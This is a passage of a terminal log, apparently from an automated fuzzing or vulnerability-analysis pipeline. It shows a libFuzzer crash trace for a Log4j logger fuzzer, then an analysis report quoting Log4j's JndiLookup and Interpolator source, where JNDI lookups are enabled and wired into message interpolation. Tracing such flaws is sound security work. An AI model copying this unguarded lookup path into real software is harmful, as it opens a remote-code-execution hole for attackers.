[2;36m                    [0m         [39m        [0m[39mat [0m[1;35morg.apache.logging.log4j.core.Logger.log[0m[1;39m([0m[39mLogger.jav[0m[1;92ma:110[0m[1;39m)[0m                [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35morg.apache.logging.log4j.spi.AbstractLogger.warn[0m[1;39m([0m[39mAbstractLogger.jav[0m[1;92ma:1916[0m[1;39m)[0m          [2m                [0m
[2;36m                    [0m         [39m        [0m[39mat [0m                                                                         [2m                [0m
[2;36m                    [0m         [1;35mcom.example.SimpleLoggerFuzzer.fuzzerTestOneInput[0m[1;39m([0m[39mSimpleLoggerFuzzer.jav[0m[1;92ma:42[0m[1;39m)[0m       [2m                [0m
[2;36m                    [0m         [39mDEDUP_TOKEN: 03a39a742f79fa3d[0m                                                       [2m                [0m
[2;36m                    [0m         [39m== libFuzzer crashing input ==[0m                                                      [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95missue[0m[39m>[0m                                                                            [2m                [0m
[2;36m                    [0m         [39m===Analysis [0m[33mReport[0m[39m===[0m                                                               [2m                [0m
[2;36m                    [0m         [39m# Analysis Report[0m                                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Relevant Code Snippets[0m                                                           [2m                [0m
[2;36m                    [0m         [39m<code_snippets>[0m                                                                     [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.jav[0m[1;92ma:1[0m[39m-[0m[1;36m88[0m        [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import javax.naming.InitialContext;[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import javax.naming.NamingException;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.config.plugins.Plugin;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m: * Looks up keys from JNDI resources.[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:@[0m[1;35mPlugin[0m[1;39m([0m[39mname = [0m[32m"jndi"[0m[39m, category = [0m[32m"Lookup"[0m[1;39m)[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:public class JndiLookup implements StrLookup [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:    private static boolean ENABLE_JNDI = true;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    [0m[35m/[0m[39m** JNDI resourcce path prefix used in a J2EE container *[0m[35m/[0m                   [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = [0m[32m"java:comp/env/"[0m[39m;[0m  [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String key[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, key[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * Get the value of the JNDI resource.[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     * @param event The current LogEvent [0m[1;39m([0m[39mis ignored by this StrLookup[0m[1;39m)[0m[39m.[0m         [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:     * @param key  the JNDI resource name to be looked up, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:     * @return The value of the JNDI resource.[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, final String key[0m[1;39m)[0m[39m [0m[1;39m{[0m               [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:        if [0m[1;39m([0m[39mkey == null || ! ENABLE_JNDI[0m[1;39m)[0m[39m [0m[1;39m{[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:        try [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:            InitialContext ctx = new [0m[1;35mInitialContext[0m[1;39m([0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:            return [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mctx.lookup[0m[1;39m([0m[1;35mconvertJndiName[0m[1;39m([0m[39mkey[0m[1;39m)[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:        [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mNamingException e[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:            return null;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:     * Convert the given JNDI name to the actual JNDI name to use.[0m               [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:     * Default implementation applies the [0m[32m"java:comp/env/"[0m[39m prefix[0m                [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     * unless other scheme like [0m[32m"java:"[0m[39m is given.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * @param jndiName The name of the resource.[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * @return The fully qualified name to look up.[0m                              [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    private String [0m[1;35mconvertJndiName[0m[1;39m([0m[39mString jndiName[0m[1;39m)[0m[39m [0m[1;39m{[0m                            [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:        if [0m[1;39m([0m[39m![0m[1;35mjndiName.startsWith[0m[1;39m([0m[39mCONTAINER_JNDI_RESOURCE_PATH_PREFIX[0m[1;39m)[0m[39m && [0m        [2m                [0m
[2;36m                    [0m         [1;35mjndiName.indexOf[0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m == [0m[1;36m-1[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;[0m           [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:        return jndiName;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    public static void [0m[1;35msetEnableJndi[0m[1;39m([0m[39mboolean enableJndi[0m[1;39m)[0m[39m [0m[1;39m{[0m                       [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:        ENABLE_JNDI = enableJndi;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    public static boolean [0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:        return ENABLE_JNDI;[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.jav[0m[1;92ma:1[0m[39m-[0m[1;36m143[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.lookup;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.HashMap;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.Logger;[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginManager;[0m               [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.config.plugins.PluginType;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.status.StatusLogger;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m: * The Interpolator is a StrLookup that acts as a proxy for all the other [0m       [2m                [0m
[2;36m                    [0m         [39mStrLookups.[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m:public class Interpolator implements StrLookup [0m[1;39m{[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:    private static final Logger LOGGER = [0m[1;35mStatusLogger.getLogger[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    [0m[35m/[0m[39m** Constant for the prefix separator. *[0m[35m/[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:    private static final char PREFIX_SEPARATOR = [0m[32m':'[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:    private final Map<String, StrLookup> lookups = new HashMap<String, [0m          [2m                [0m
[2;36m                    [0m         [39mStrLookup>[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:    private final StrLookup defaultLookup;[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[39mfinal StrLookup defaultLookup[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:        this.defaultLookup = defaultLookup == null ? new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew [0m          [2m                [0m
[2;36m                    [0m         [39mHashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m : defaultLookup;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:        final PluginManager manager = new [0m[1;35mPluginManager[0m[1;39m([0m[32m"Lookup"[0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:        [0m[1;35mmanager.collectPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:        final Map<String, PluginType> plugins = [0m[1;35mmanager.getPlugins[0m[1;39m([0m[1;39m)[0m[39m;[0m            [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:        for [0m[1;39m([0m[39mfinal Map.Entry<String, PluginType> entry : [0m[1;35mplugins.entrySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m   [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:            @[0m[1;35mSuppressWarnings[0m[1;39m([0m[32m"unchecked"[0m[1;39m)[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:            final Class<StrLookup> clazz = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[1;35m.getPluginClass[0m[1;39m([0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:            try [0m[1;39m{[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:                [0m[1;35mlookups.put[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m[1;35mclazz.newInstance[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:            [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                       [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:                [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to create Lookup for "[0m[39m + [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m   [2m                [0m
[2;36m                    [0m         [39mex[0m[1;39m)[0m[39m;[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:            [0m[1;39m}[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:        [0m[1;39m}[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:     * Create the default Interpolator using only Lookups that work without an [0m  [2m                [0m
[2;36m                    [0m         [39mevent.[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:    public [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:        this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:     [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:     * Resolves the specified variable. This implementation will try to extract[0m  [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:     * a variable prefix from the given variable name [0m[1;39m([0m[39mthe first colon [0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m is[0m  [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:     * used as prefix separator[0m[1;39m)[0m[39m. It then passes the name of the variable with[0m   [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:     * the prefix stripped to the lookup object registered for this prefix. If[0m   [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:     * no prefix can be found or if the associated lookup object cannot resolve[0m  [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:     * this variable, the default lookup object will be used.[0m                    [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:     * @param var the name of the variable whose value is to be looked up[0m        [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:     * @return the value of this variable or <b>null<[0m[35m/[0m[95mb[0m[39m> if it cannot be[0m         [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:     * resolved[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:        return [0m[1;35mlookup[0m[1;39m([0m[39mnull, var[0m[1;39m)[0m[39m;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:    [0m[1;39m}[0m                                                                            [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:     * Resolves the specified variable. This implementation will try to extract[0m  [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:     * a variable prefix from the given variable name [0m[1;39m([0m[39mthe first colon [0m[1;39m([0m[32m':'[0m[1;39m)[0m[39m is[0m  [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:     * used as prefix separator[0m[1;39m)[0m[39m. It then passes the name of the variable with[0m   [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:     * the prefix stripped to the lookup object registered for this prefix. If[0m   [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m:     * no prefix can be found or if the associated lookup object cannot resolve[0m  [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m:     * this variable, the default lookup object will be used.[0m                    [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m:     *[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m:     * @param event The current LogEvent or null.[0m                                [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m:     * @param var the name of the variable whose value is to be looked up[0m        [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m:     * @return the value of this variable or <b>null<[0m[35m/[0m[95mb[0m[39m> if it cannot be[0m         [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m:     * resolved[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m:    @Override[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m:    public String [0m[1;35mlookup[0m[1;39m([0m[39mfinal LogEvent event, String var[0m[1;39m)[0m[39m [0m[1;39m{[0m                    [2m                [0m
[2;36m                    [0m         [1;36m101[0m[39m:        if [0m[1;39m([0m[39mvar == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m102[0m[39m:            return null;[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m103[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m104[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m105[0m[39m:        final int prefixPos = [0m[1;35mvar.indexOf[0m[1;39m([0m[39mPREFIX_SEPARATOR[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m106[0m[39m:        if [0m[1;39m([0m[39mprefixPos >= [0m[1;36m0[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m107[0m[39m:            final String prefix = [0m[1;35mvar.substring[0m[1;39m([0m[1;36m0[0m[39m, prefixPos[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m108[0m[39m:            final String name = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                   [2m                [0m
[2;36m                    [0m         [1;36m109[0m[39m:            final StrLookup lookup = [0m[1;35mlookups.get[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                       [2m                [0m
[2;36m                    [0m         [1;36m110[0m[39m:            String value = null;[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m111[0m[39m:            if [0m[1;39m([0m[39mlookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                               [2m                [0m
[2;36m                    [0m         [1;36m112[0m[39m:                value = event == null ? [0m[1;35mlookup.lookup[0m[1;39m([0m[39mname[0m[1;39m)[0m[39m : [0m                  [2m                [0m
[2;36m                    [0m         [1;35mlookup.lookup[0m[1;39m([0m[39mevent, name[0m[1;39m)[0m[39m;[0m                                                         [2m                [0m
[2;36m                    [0m         [1;36m113[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m114[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m115[0m[39m:            if [0m[1;39m([0m[39mvalue != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m116[0m[39m:                return value;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m117[0m[39m:            [0m[1;39m}[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m118[0m[39m:            var = [0m[1;35mvar.substring[0m[1;39m([0m[39mprefixPos + [0m[1;36m1[0m[1;39m)[0m[39m;[0m                                 [2m                [0m
[2;36m                    [0m         [1;36m119[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m120[0m[39m:        if [0m[1;39m([0m[39mdefaultLookup != null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m121[0m[39m:            return event == null ? [0m[1;35mdefaultLookup.lookup[0m[1;39m([0m[39mvar[0m[1;39m)[0m[39m : [0m                 [2m                [0m
